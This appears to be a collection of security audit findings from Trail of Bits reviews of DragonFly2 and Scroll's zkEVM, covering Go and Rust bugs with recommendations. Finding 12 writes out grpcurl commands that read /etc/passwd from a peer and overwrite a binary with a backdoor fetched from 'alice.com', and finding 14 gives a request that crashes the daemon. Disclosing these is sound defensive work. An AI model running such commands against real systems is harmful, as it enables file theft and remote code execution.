ush content to disk while closing will not be caught, and the application may assume that content was written to disk successfully. See the example in gure 7.1. file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() Figure 7.1: Part of the localTaskStore.WritePiece method ( Dragonfly2/client/daemon/storage/local_storage.go#124128 ) The bug occurs in multiple locations throughout the codebase. Exploit Scenario The server on which the DragonFly2 application runs has a disk that periodically fails to ush content due to a hardware failure. As a result, certain methods in the codebase sometimes fail to write content to disk. This causes undened behavior. Recommendations Short term, consider closing les explicitly at the end of functions and checking for errors. Alternatively, defer a wrapper function to close the le and check for errors if applicable. Long term, test the DragonFly2 system with failure injection technique. This technique works by randomly failing system-level calls (like the one responsible for writing a le to a disk) and checking if the application under test correctly handles the error. References  \"Don't defer Close() on writable les\" blog post  Security assessment techniques for Go projects, Fault injection chapter", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Timing attacks against Proxys basic authentication are possible ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The access control mechanism for the Proxy feature uses simple string comparisons and is therefore vulnerable to timing attacks. An attacker may try to guess the password one character at a time by sending all possible characters to a vulnerable mechanism and measuring the comparison instructions execution times. The vulnerability is shown in gure 8.1, where both the username and password are compared with a short-circuiting equality operation. if user != proxy.basicAuth.Username || pass != proxy.basicAuth.Password { Figure 8.1: Part of the ServeHTTP method with code line vulnerable to the timing attack ( Dragonfly2/client/daemon/proxy/proxy.go#316 ) It is currently undetermined what an attacker may be able to do with access to the proxy password. Recommendations Short term, replace the simple string comparisons used in the ServeHTTP method with constant-time comparisons. This will prevent the possibility of timing the comparison operation to leak passwords. Long term, use static analysis to detect code vulnerable to simple timing attacks. For example, use the CodeQLs go/timing-attack query . References   Timeless Timing Attacks : this presentation explains how timing attacks can be made more ecient. Go crypto/subtle ConstantTimeCompare method : this method implements a constant-time comparison.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "9. Possible panics due to nil pointer dereference when using variables created alongside an error ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "We found two instances in the DragonFly codebase where the rst return value of a function is dereferenced even when the function returns an error (gures 9.1 and 9.2). This can result in a nil dereference, and cause code to panic . The codebase may contain additional instances of the bug. request, err := source.NewRequestWithContext(ctx, parentReq.Url, parentReq.UrlMeta.Header) if err != nil { log.Errorf( \"generate url [%v] request error: %v\" , request.URL, err) span.RecordError(err) return err } Figure 9.1: If there is an error, the request.URL variable is used even if the request is nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#621626 ) prefetch, err := ptm.getPeerTaskConductor(context.Background(), taskID, req, limit, nil , nil , desiredLocation, false ) if err != nil { logger.Errorf( \"prefetch peer task %s/%s error: %s\" , prefetch.taskID, prefetch.peerID, err) return nil } Figure 9.2: prefetch may be nil when there is an error, and trying to get prefetch.taskID can cause a nil dereference panic ( Dragonfly2/client/daemon/peer/peertask_manager.go#294298 ) Exploit Scenario Eve is a malicious actor operating a peer machine. She sends a dfdaemonv1.DownRequest request to her peer Alice. Alices machine receives the request, resolves a nil variable in the server.Download method, and panics. Recommendations Short term, change the error message code to avoid making incorrect dereferences. Long term, review codebase against this type of issue. Systematically use static analysis to detect this type of vulnerability. For example, use  Semgrep invalid-usage-of-modified-variable rule .", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. TrimLeft is used instead of TrimPrex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The strings.TrimLeft function is used at multiple points in the Dragony codebase to remove a prex from a string. This function has unexpected behavior; its second argument is an unordered set of characters to remove, rather than a prex to remove. The strings.TrimPrefix function should be used instead. The issues that were found are presented in gures 10.14. However, the codebase may contain additional issues of this type. urlMeta.Range = strings.TrimLeft(r, http.RangePrefix) Figure 10.1: Dragonfly2/scheduler/job/job.go#175 rg = strings.TrimLeft(r, \"bytes=\" ) Figure 10.2: Dragonfly2/client/dfget/dfget.go#226 urlMeta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.3: Dragonfly2/client/daemon/objectstorage/objectstorage.go#288 meta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.4: Dragonfly2/client/daemon/transport/transport.go#264 Figure 10.5 shows an example of the dierence in behavior between strings.TrimLeft and strings.TrimPrefix : strings.TrimLeft( \"bytes=bbef02\" , \"bytes=\" ) == \"f02\" strings.TrimPrefix( \"bytes=bbef02\" , \"bytes=\" ) == \"bbef02\" Figure 10.5: dierence in behavior between strings.TrimLeft and strings.TrimPrefix The nding is informational because we were unable to determine an exploitable attack scenario based on the vulnerability. Recommendations Short term, replace incorrect calls to string.TrimLeft method with calls to string.TrimPrefix . Long term, test DragonFly2 functionalities against invalid and malformed data, such HTTP headers that do not adhere to the HTTP specication.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe, and may cause inconsistent states if they are called at the same time as other functions. Figure 11.1 shows implementation of the Vertex.DeleteInEdges function. // DeleteInEdges deletes inedges of vertex. func (v *Vertex[T]) DeleteInEdges() { for _, parent := range v.Parents.Values() { parent.Children.Delete(v) } v.Parents = set.NewSafeSet[*Vertex[T]]() } Figure 11.1: The Vertex.DeleteInEdges method ( Dragonfly2/pkg/graph/dag/vertex.go#5461 ) The for loop iterates through the vertexs parents, deleting the corresponding entry in their Children sets. After the for loop, the vertexs Parents set is assigned to be the empty set. However, if a parent is added to the vertex (on another thread) in between these two operations, the state will be inconsistent. The parent will have the vertex in its Children set, but the vertex will not have the parent in its Parents set. The same problem happens in Vertex.DeleteOutEdges method, since its code is essentially the same, but with Parents swapped with Children in all occurrences. It is undetermined what exploitable problems this bug can cause. Recommendations Short term, give Vertex.DeleteInEdges and Vertex.DeleteOutEdges methods access to the DAG s mutex, and use mu.Lock to prevent other threads from accessing the DAG while Vertex.DeleteInEdges or Vertex.DeleteOutEdges is in progress. Long term, consider writing randomized stress tests for these sorts of bugs; perform many writes concurrently, and see if any data races or invalid states occur. References  Documentation on golangs data race detector", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Arbitrary le read and write on a peer machine ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "A peer exposes the gRPC API and HTTP API for consumption by other peers. These APIs allow peers to send requests that force the recipient peer to create les in arbitrary le system locations, and to read arbitrary les. This allows peers to steal other peers secret data and to gain remote code execution (RCE) capabilities on the peers machine. The gRPC API has, among others, the ImportTask and ExportTask endpoints (gure 12.1). The rst endpoint copies the le specied in the path argument (gures 12.2 and 12.3) to a directory pointed by the dataDir conguration variable (e.g., /var/lib/dragonfly ). // Daemon Client RPC Service service Daemon{ [skipped] // Import the given file into P2P cache system rpc ImportTask(ImportTaskRequest) returns (google.protobuf.Empty); // Export or download file from P2P cache system rpc ExportTask(ExportTaskRequest) returns (google.protobuf.Empty); [skipped] } Figure 12.1: Denition of the gRPC API exposed by a peer ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#113131 ) message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 12.2: Arguments for the ImportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() if _, err = file.Seek(req.Range.Start, io.SeekStart); err != nil { return 0 , err } n, err := io.Copy(file, io.LimitReader(req.Reader, req.Range.Length)) Figure 12.3: Part of the WritePiece method (called by the handler of the ImportTask endpoint) that copies the content of a le ( Dragonfly2/client/daemon/storage/local_storage.go#124133 ) The second endpoint moves the previously copied le to a location provided by the output argument (gures 12.4 and 12.5). message ExportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // Output path of downloaded file. string output = 2 [(validate.rules). string .min_len = 1 ]; [skipped] } Figure 12.4: Arguments for the ExportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#87104 ) dstFile, err := os.OpenFile(req.Destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, defaultFileMode) if err != nil { t.Errorf( \"open tasks destination file error: %s\" , err) return err } defer dstFile.Close() // copy_file_range is valid in linux // https://go-review.googlesource.com/c/go/+/229101/ n, err := io.Copy(dstFile, file) Figure 12.5: Part of the Store method (called by the handler of the ExportTask endpoint) that copies the content of a le; req.Destination equals the output argument ( Dragonfly2/client/daemon/storage/local_storage.go#396404 ) The HTTP API, called Upload Manager, exposes the /download/:task_prefix/:task_id endpoint. This endpoint can be used to read a le that was previously imported with the relevant gRPC API call. Exploit Scenario Alice (a peer in a DragonFly2 system) wants to steal the /etc/passwd le from Bob (another peer). Alice uses the command shown in gure 12.6 to make Bob import the le to a dataDir directory. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"/etc/passwd\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}'$ BOB_IP:65000 dfdaemon.Daemon.ImportTask Figure 12.6: Command to steal /etc/passwd Next, she sends an HTTP request, similar to the one in gure 12.7, to Bob. Bob returns the content of his /etc/passwd le. GET /download/<prefix>/<sha256>?peerId=172.17.0.1-1-<tag> HTTP / 1.1 Host: $BOB_IP:55002 Range: bytes=0-100 Figure 12.7: Bobs response, revealing /etc/passwd contents Later, Alice uploads a malicious backdoor executable to the peer-to-peer network. Once Bob has downloaded (e.g., via the exportFromPeers method) and cached the backdoor le, Alice sends a request like the one shown in gure 12.8 to overwrite the /opt/dragonfly/bin/dfget binary with the backdoor. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://alice.com/backdoor\", \"output\":\"/opt/dragonfly/bin/dfget\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}' $BOB_IP:65000 dfdaemon.Daemon.ExportTask Figure 12.8: Command to overwrite dfget binary After some time Bob restarts the dfget daemon, which executes Alices backdoor on his machine. Recommendations Short term, sandbox the DragonFly2 daemon, so that it can access only les within a certain directory. Mitigate path traversal attacks. Ensure that APIs exposed by peers cannot be used by malicious actors to gain arbitrary le read or write, code execution, HTTP request forgery, and other unintended capabilities.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "13. Manager generates mTLS certicates for arbitrary IP addresses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "A peer can obtain a valid TLS certicate for arbitrary IP addresses, eectively rendering the mTLS authentication useless. The issue is that the Managers Certificate gRPC service does not validate if the requested IP addresses belong to the peer requesting the certicatethat is, if the peer connects from the same IP address as the one provided in the certicate request. Please note that the issue is known to developers and marked with TODO comments, as shown in gure 13.1. if addr, ok := p.Addr.(*net.TCPAddr); ok { ip = addr.IP.String() } else { ip, _, err = net.SplitHostPort(p.Addr.String()) if err != nil { return nil , err } } // Parse csr. [skipped] // Check csr signature. // TODO check csr common name and so on. if err = csr.CheckSignature(); err != nil { return nil , err } [skipped] // TODO only valid for peer ip // BTW we need support both of ipv4 and ipv6. ips := csr.IPAddresses if len (ips) == 0 { // Add default connected ip. ips = []net.IP{net.ParseIP(ip)} } Figure 13.1: The Managers Certificate gRPC handler for the IssueCertificate endpoint ( Dragonfly2/manager/rpcserver/security_server_v1.go#6598 ) Recommendations Short term, implement the missing IP addresses validation in the IssueCertificate endpoint of the Managers Certificate gRPC service. Ensure that a peer cannot obtain a certicate with an ID that does not belong to the peer. Long term, research common security problems in PKI infrastructures and ensure that DragonFly2s PKI does not have them. Ensure that if a peer IP address changes, the certicates issued for that IP are revoked.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "14. gRPC requests are weakly validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The gRPC requests are weakly validated, and some requests elds are not validated at all. For example, the ImportTaskRequest s url_meta eld is not validated and may be missing from a request (see gure 14.1). Sending requests to the ImportTask endpoint (as shown in gure 14.2) triggers the code shown in gure 14.3. The highlighted call to the logger accesses the req.UrlMeta.Tag variable, causing a nil dereference panic (because the req.UrlMeta variable is nil ). message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 14.1: ImportTaskRequest denition, with the url_meta eld missing any validation rules ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"x\"}' $PEER_IP:65000 dfdaemon.Daemon.ImportTask Figure 14.2: An example command that triggers panic in the daemon gRPC server s.Keep() peerID := idgen.PeerIDV1(s.peerHost.Ip) taskID := idgen.TaskIDV1(req.Url, req.UrlMeta) log := logger.With( \"function\" , \"ImportTask\" , \"URL\" , req.Url, \"Tag\" , req.UrlMeta.Tag, \"taskID\" , taskID, \"file\" , req.Path) Figure 14.3: The req.UrlMeta variable may be nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#871874 ) Another example of weak validation can be observed in the denition of the UrlMeta request (gure 14.4). The digest eld of the request should contain a prex followed by an either MD5 or SHA256 hex-encoded hash. While prex and hex-encoding is validated, length of the hash is not. The length is validated only during the parsing . // UrlMeta describes url meta info. message UrlMeta { // Digest checks integrity of url content, for example md5:xxx or sha256:yyy. string digest = 1 [(validate.rules). string = {pattern: \"^(md5)|(sha256):[A-Fa-f0-9]+$\" , ignore_empty: true }]; Figure 14.4: The UrlMeta request denition, with a regex validation of the digest eld ( api/pkg/apis/common/v1/common.proto#163166 ) Recommendations Short term, add missing validations for the ImportTaskRequest and UrlMeta messages. Centralize validation of external inputs, so that it is easy to understand what properties are enforced on the data. Validate data as early as possible (for example, in the proto-related code). Long term, use fuzz testing to detect missing validations.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "15. Weak integrity checks for downloaded les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The DragonFly2 uses a variety of hash functions, including the MD5 hash. This algorithm does not provide collision resistance; it is secure only against preimage attacks. While these security guarantees may be enough for the DragonFly2 system, it is not completely clear if there are any scenarios where lack of the collision resistance would compromise the system. There are no clear benets to keeping the MD5 hash function in the system. Figure 15.1 shows the core validation method that protects the integrity of les downloaded from the peer-to-peer network. As shown in the gure, the hash of a le (sha256) is computed over hashes of all les pieces (MD5). So the security provided by the more secure sha256 hash is lost, because of use of the MD5. var pieceDigests [] string for i := int32 ( 0 ); i < t.TotalPieces; i++ { pieceDigests = append (pieceDigests, t.Pieces[i].Md5) } digest := digest.SHA256FromStrings(pieceDigests...) if digest != t.PieceMd5Sign { t.Errorf( \"invalid digest, desired: %s, actual: %s\" , t.PieceMd5Sign, digest) t.invalid.Store( true ) return ErrInvalidDigest } Figure 15.1: Part of the method responsible for validation of les integrity ( Dragonfly2/client/daemon/storage/local_storage.go#255265 ) The MD5 algorithm is hard coded over the entire codebase (e.g., gure 15.2), but in some places the hash algorithm is congurable (e.g., gure 15.3). Further investigation is required to determine whether an attacker can exploit the congurability of the system to perform downgrade attacksthat is, to downgrade the security of the system by forcing users to use the MD5 algorithm, even when a more secure option is available. reader, err = digest.NewReader( digest.AlgorithmMD5 , io.LimitReader(resp.Body, int64 (req.piece.RangeSize)), digest.WithEncoded(req.piece.PieceMd5), digest.WithLogger(req.log)) Figure 15.2: Hardcoded hash function ( Dragonfly2/client/daemon/peer/piece_downloader.go#188 ) switch algorithm { case AlgorithmSHA1: if len (encoded) != 40 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA256: if len (encoded) != 64 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA512: if len (encoded) != 128 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmMD5: if len (encoded) != 32 { return nil , errors.New( \"invalid encoded\" ) } default : return nil , errors.New( \"invalid algorithm\" ) } Figure 15.3: User-congurable hash function ( Dragonfly2/pkg/digest/digest.go#111130 ) Moreover, there are missing validations of the integrity hashes, for example in the ImportTask method (gure 15.5). // TODO: compute and check hash digest if digest exists in ImportTaskRequest Figure 15.4: Missing hash validation ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#904 ) Exploit Scenario Alice, a peer in the DragonFly2 system, creates two images: an innocent one, and one with malicious code. Both images consist of two pieces, and Alice generates the pieces so that their respective MD5 hashes collide (are the same). Therefore, the PieceMd5Sign metadata of both images are equal. Alice shares the innocent image with other peers, who attest to their validity (i.e., that it works as expected and is not malicious). Bob wants to download the image and requests it from the peer-to-peer network. After downloading the image, Bob checks its integrity with a SHA256 hash that is known to him. Alice, who is participating in the network, had already provided Bob the other image, the malicious one. Bob unintentionally uses the malicious image. Recommendations Short term, remove support for the MD5. Always use SHA256, SHA3, or another secure hashing algorithm. Long term, take an inventory of all cryptographic algorithms used across the entire system. Ensure that no deprecated or non-recommended algorithms are used.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "16. Invalid error handling, missing return statement ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "There are two instances of a missing return statement inside an if branch that handles an error from a downstream method. The rst issue is in the UpdateTransportOption function, where failed parsing of the Proxy option prints an error, but does not terminate execution of the UpdateTransportOption function. func UpdateTransportOption(transport *http.Transport, optionYaml [] byte ) error { [skipped] if len (opt.Proxy) > 0 { proxy, err := url.Parse(opt.Proxy) if err != nil { fmt.Printf( \"proxy parse error: %s\\n\" , err) } transport.Proxy = http.ProxyURL(proxy) } Figure 16.1: the UpdateTransportOption function ( Dragonfly2/pkg/source/transport_option.go#4558 ) The second issue is in the GetV1Preheat method, where failed parsing of the rawID argument does not result in termination of the method execution. Instead, the id variable will be assigned either the zero or max_uint value. func (s *service) GetV1Preheat(ctx context.Context, rawID string ) (*types.GetV1PreheatResponse, error ) { id, err := strconv.ParseUint(rawID, 10 , 32 ) if err != nil { logger.Errorf( \"preheat convert error\" , err) } Figure 16.2: the GetV1Preheat function ( Dragonfly2/manager/service/preheat.go#6670 ) Recommendations Short term, add the missing return statements in the UpdateTransportOption method. Long term, use static analysis to detect similar bugs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "17. Tiny le download uses hard coded HTTP protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The code in the scheduler for downloading a tiny le is hard coded to use the HTTP protocol, rather than HTTPS. This means that an attacker could perform a Man-in-the-Middle attack, changing the network request so that a dierent piece of data gets downloaded. Due to the use of weak integrity checks ( TOB-DF2-15 ), this modication of the data may go unnoticed. // DownloadTinyFile downloads tiny file from peer without range. func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 17.1: Hard-coded use of HTTP ( Dragonfly2/scheduler/resource/peer.go#435446 ) Exploit Scenario A network-level attacker who cannot join a peer-to-peer network performs a Man-in-the-Middle attack on peers. The adversary can do this because peers (partially) communicate over plaintext HTTP protocol. The attack chains this vulnerability with the one described in TOB-DF2-15 to replace correct les with malicious ones. Unconscious peers use the malicious les. Recommendations Short term, add a conguration option to use HTTPS for these downloads. Long term, audit the rest of the repository for other hard-coded uses of HTTP.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "18. Incorrect log message ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The scheduler service may sometimes output two dierent logging messages stating two dierent reasons why a task is being registered as a normal task. The following code is used to register a peer and trigger a seed peer download task. // RegisterPeerTask registers peer and triggers seed peer download task. func (v *V1) RegisterPeerTask(ctx context.Context, req *schedulerv1.PeerTaskRequest) (*schedulerv1.RegisterResult, error ) { [skipped] // The task state is TaskStateSucceeded and SizeScope is not invalid. switch sizeScope { case commonv1.SizeScope_EMPTY: [skipped] case commonv1.SizeScope_TINY: // Validate data of direct piece. if !peer.Task.CanReuseDirectPiece() { direct piece is %d, content length is %d\" , len (task.DirectPiece), task.ContentLength.Load()) peer.Log.Warnf( \"register as normal task, because of length of break } result, err := v.registerTinyTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil case commonv1.SizeScope_SMALL: result, err := v.registerSmallTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil } result, err := v.registerNormalTask(ctx, peer) if err != nil { peer.Log.Error(err) v.handleRegisterFailure(ctx, peer) return nil , dferrors.New(commonv1.Code_SchedError, err.Error()) } peer.Log.Info( \"register as normal task, because of invalid size scope\" ) return result, nil } Figure 18.1: Code snippet with incorrect logging ( Dragonfly2/scheduler/service/service_v1.go#93173 ) Each of the highlighted sets of lines above print register as normal task, because [reason], before exiting from the switch statement. Then, the task is registered as a normal task. Finally, another message is logged: register as normal task, because of invalid size scope. This means that two dierent messages may be printed (one as a warning message, one as an informational message) with two contradicting reasons for why the task was registered as a normal task. This does not cause any security problems directly but may lead to diculties while managing a DragonFly system or debugging DragonFly code. Recommendations Short term, move the peer.Log.Info function call into a default branch in the switch statement so that it is called only when the size scope is invalid.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Manager makes requests to external endpoints with disabled TLS authentication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Incorrect handling of a task structures usedTra\u0000c eld ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The processPieceFromSource method (gure 4.1) is part of a task processing mechanism. The method writes pieces of data to storage, updating a Task structure along the way. The method does not update the structures usedTraffic eld, because an uninitialized variable n is used as a guard to the AddTraffic method call, instead of the result.Size variable. var n int64 result.Size, err = pt.GetStorage().WritePiece( [skipped] ) result.FinishTime = time.Now().UnixNano() if n > 0 { pt.AddTraffic( uint64 (n)) } Figure 4.1: Part of the processPieceFromSource method with a bug ( Dragonfly2/client/daemon/peer/piece_manager.go#264290 ) Exploit Scenario A task is processed by a peer. The usedTraffic metadata is not updated during the processing. Rate limiting is incorrectly applied, leading to a denial-of-service condition for the peer. Recommendations Short term, replace the n variable with the result.Size variable in the processPieceFromSource method. Long term, add tests for checking if all Task structure elds are correctly updated during task processing. Add similar tests for other structures.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "19. Usage of architecture-dependent int type ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The DragonFly2 uses int and uint numeric types in its golang codebase. These types bit sizes are either 32 or 64 bits, depending on the hardware where the code is executed. Because of that, DragonFly2 components running on dierent architectures may behave dierently. These discrepancies in behavior may lead to unexpected crashes of some components or incorrect data handling. For example, the handlePeerSuccess method casts peer.Task.ContentLength variable to the int type. Schedulers running on dierent machines may behave dierently, because of this behavior. if len (data) != int (peer.Task.ContentLength.Load()) { peer.Log.Errorf( \"download tiny task length of data is %d, task content length is %d\" , len (data), peer.Task.ContentLength.Load()) return } Figure 19.1: example use of architecture-dependent int type ( Dragonfly2/scheduler/service/service_v1.go#12401243 ) Recommendations Short term, use a xed bit size for all integer values. Alternatively, ensure that using the int type will not impact any computing where results must agree on all participants computers. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. BarycentricEvaluationCong circuit does not constrain the size of blob values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": " The BarycentricEvaluationConfig circuit constrains the values of a polynomial and  evaluation, each represented as vectors of byte-valued cells, so that equals the result of evaluating a polynomial interpolated through several blob value eld elements at . The blob values are constrained to correspond to 32-cell little-endian representation, as shown in gure 1.1.   // assign LE-bytes of blob scalar field element. let blob_i_le = self .scalar.range().gate.assign_witnesses( ctx, blob_i .to_le_bytes() .iter() .map(|&x| Value::known(Fr::from(x as u64 ))), ); let blob_i_scalar = Scalar::from_raw(blob_i. 0 ); let blob_i_crt = self .scalar .load_private(ctx, Value::known(fe_to_biguint(&blob_i_scalar).into())); // compute the limbs for blob scalar field element. let limb1 = self .scalar.range().gate.inner_product( ctx, blob_i_le[ 0 .. 11 ].iter().map(|&x| QuantumCell::Existing(x)), powers_of_256[ 0 .. 11 ].to_vec(), );  self .scalar.range().gate.assert_equal( ctx, QuantumCell::Existing(limb1), QuantumCell::Existing(blob_i_crt.truncation.limbs[ 0 ]), );  // the most-significant byte of blob scalar field element is 0 as we expect this 15 Scroll ZkEVM EIP- // representation to be in its canonical form. self .scalar.range().gate.assert_equal( ctx, QuantumCell::Existing(blob_i_le[ 31 ]), QuantumCell::Constant(Fr::zero()), ); Figure 1.1: Constraints for each blob value ( aggregator/src/aggregation/barycentric.rs#239290 ) The values in the blob_i_le array are not constrained to be values in the range [0, 256), so this circuit is always satisable, even if the value of the blob_i_crt variable is above the intended 31-byte limit. However, since the BarycentricEvaluationConfig circuit is used only in conjunction with the BlobDataConfig circuit, the values are in fact constrained to the 31-byte limit. These values become the rst BLOB_WIDTH entries in the barycentric_assignments array. Each integer in that portion of the barycentric_assignments array is then constrained to equal the integer in the corresponding position in the blob_fields array. The values in the blob_fields array are represented as 31-limb base-256 numbers, while the values in the barycentric_assignments array are represented as 3-limb, base-2 88 numbers, as shown in gure 1.2. for (blob_crt, blob_field) in blob_crts.iter().zip_eq(blob_fields.iter()) { let limb1 = rlc_config.inner_product( & mut region, &blob_field[ 0 .. 11 ], &pows_of_256, & mut rlc_config_offset, )?; let limb2 = rlc_config.inner_product( & mut region, &blob_field[ 11 .. 22 ], &pows_of_256, & mut rlc_config_offset, )?; let limb3 = rlc_config.inner_product( & mut region, &blob_field[ 22 .. 31 ], &pows_of_256[ 0 .. 9 ], & mut rlc_config_offset, )?; region.constrain_equal(limb1.cell(), blob_crt.truncation.limbs[ 0 ].cell())?; region.constrain_equal(limb2.cell(), blob_crt.truncation.limbs[ 1 ].cell())?; region.constrain_equal(limb3.cell(), blob_crt.truncation.limbs[ 2 ].cell())?; } Figure 1.2: Constraints connecting the 3-limb representation to the 31-byte representation ( aggregator/src/aggregation/blob_data.rs#937959 ) 16 Scroll ZkEVM EIP- Unlike the similar constraints in BarycentricEvaluationConfig , the cells in blob_fields are constrained to be in the range [0, 256), so the limbs are in fact byte values. This happens because they are retrieved from the byte column, which is constrained by a lookup to be in that range, as shown in gures 1.3 and 1.4. let mut blob_fields: Vec < Vec <AssignedCell<Fr, Fr>>> = Vec ::with_capacity(BLOB_WIDTH); let blob_bytes = assigned_rows .iter() .take(N_ROWS_METADATA + N_ROWS_DATA) .map(|row| row. byte .clone()) .collect::< Vec <_>>(); for chunk in blob_bytes.chunks_exact(N_BYTES_31) { // blob bytes are supposed to be deserialised in big-endianness. However, we // have the export from BarycentricConfig in little-endian bytes. blob_fields.push(chunk.iter().rev().cloned().collect()); } Figure 1.3: The cells in blob_fields are from the byte column. ( aggregator/src/aggregation/blob_data.rs#861872 ) meta.lookup( \"BlobDataConfig (0 < byte < 256)\" , |meta| { let byte_value = meta.query_advice(config.byte, 